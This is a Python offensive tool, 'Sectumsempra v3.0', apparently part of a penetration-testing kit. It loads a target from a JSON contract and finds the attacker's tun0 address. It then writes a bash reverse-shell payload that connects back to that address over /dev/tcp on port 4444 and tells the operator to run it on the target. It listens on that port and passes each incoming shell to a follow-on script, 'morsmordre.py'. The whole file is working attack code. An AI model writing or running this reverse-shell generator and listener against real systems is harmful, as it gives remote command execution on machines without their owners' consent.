#!/usr/bin/env python3
"""
Sectumsempra v3.0 - Green Engine
Bulletproof Bridge
"""

import socket
import subprocess
import os
import json
import sys
import time
import threading
from pathlib import Path

def status(msg, level="info"):
    ts = time.strftime("%H:%M:%S")
    colors = {"info": "\033[94m", "success": "\033[92m", "warning": "\033[93m", "error": "\033[91m", "shell": "\033[91m", "handoff": "\033[95m"}
    ind = {"info": "[*]", "success": "[+]", "warning": "[!]", "error": "[-]", "shell": "[SHELL]", "handoff": "[»]"}
    print(f"{colors.get(level, '')}{ind.get(level, '[*]')} [{ts}] {msg}\033[0m", flush=True)

def banner():
    print("\033[92m┌─────────────────────────────────────┐\033[0m")
    print("\033[92m│ Sectumsempra v3.0 - Green Bridge  │\033[0m")
    print("\033[92m└─────────────────────────────────────┘\033[0m")

def find_tun0():
    try:
        import netifaces
        if 'tun0' in netifaces.interfaces():
            return netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
    except:
        pass
    try:
        import re
        r = subprocess.run(["ip", "addr", "show", "tun0"], capture_output=True, text=True)
        m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', r.stdout)
        if m:
            return m.group(1)
    except:
        pass
    return "0.0.0.0"

def load_contract():
    files = sorted(Path('.').glob('netweave_*.json'))
    if not files:
        status("No NetWeave contract found", "error")
        sys.exit(1)
    
    with open(files[-1]) as f:
        data = json.load(f)
    
    status(f"Contract: {files[-1]}", "success")
    status(f"Target: {data.get('target', '')} | OS: {data.get('operating_system', 'Linux')}", "info")
    return data

def generate_payload(lhost, target_ip):
    bash = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/4444 0>&1'"
    filename = f"payload_linux_{target_ip.replace('.', '_')}.sh"
    with open(filename, 'w') as f:
        f.write(f"#!/bin/bash\n{bash}")
    os.chmod(filename, 0o755)
    status(f"Payload: {filename}", "success")
    status(f"Execute on target: bash {filename}", "info")
    return filename

def handle_connection(sock, addr, target, os_type, lhost):
    status(f"SHELL LANDED from {addr[0]}:{addr[1]}", "shell")
    status("Spawning Morsmordre...", "handoff")
    
    # Set up environment
    env = os.environ.copy()
    env['MORSMORDRE_TARGET'] = target
    env['MORSMORDRE_OS'] = os_type
    env['MORSMORDRE_LHOST'] = lhost
    
    # Create file objects from socket
    sock_file = sock.makefile('rwb', buffering=0)
    
    try:
        # Spawn Morsmordre with socket as stdin/stdout
        proc = subprocess.Popen(
            [sys.executable, 'morsmordre.py'],
            stdin=sock_file,
            stdout=sock_file,
            stderr=subprocess.PIPE,  # Keep stderr local for debugging
            env=env
        )
        
        # Read stderr in thread to show Morsmordre output locally
        def read_stderr():
            while True:
                line = proc.stderr.readline()
                if not line:
                    break
                print(line.decode('utf-8', errors='ignore'), end='', flush=True)
        
        err_thread = threading.Thread(target=read_stderr)
        err_thread.daemon = True
        err_thread.start()
        
        status("Morsmordre running - wait for it to complete...", "success")
        proc.wait()
        status("Morsmordre finished", "success")
        
    except Exception as e:
        status(f"Error: {e}", "error")
    finally:
        try:
            sock_file.close()
        except:
            pass
        try:
            sock.close()
        except:
            pass
        status("Session closed", "warning")

def main():
    banner()
    
    data = load_contract()
    target_ip = data.get('target', '')
    os_type = data.get('operating_system', 'Linux')
    lhost = find_tun0()
    
    status(f"LHOST: {lhost}", "success")
    generate_payload(lhost, target_ip)
    
    # Create server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    
    status("Listener: 0.0.0.0:4444", "success")
    status("Waiting for shell...", "info")
    
    try:
        while True:
            client, addr = server.accept()
            # Handle in thread
            t = threading.Thread(target=handle_connection, 
                               args=(client, addr, target_ip, os_type, lhost))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        status("Shutting down...", "warning")
    finally:
        server.close()

if __name__ == "__main__":
    main()
